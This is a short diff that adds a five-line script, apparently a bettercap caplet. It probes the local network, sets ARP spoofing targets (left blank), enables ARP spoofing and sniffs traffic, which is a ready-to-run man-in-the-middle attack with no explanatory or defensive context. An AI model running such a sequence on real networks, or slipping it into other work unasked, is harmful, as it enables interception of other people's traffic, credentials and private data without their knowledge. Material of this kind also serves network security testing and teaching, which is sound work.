@@ -1,0 +1,5 @@
+net.probe on
+net.show
+set arp.spoof.targets
+arp.spoof on
+net.sniff on
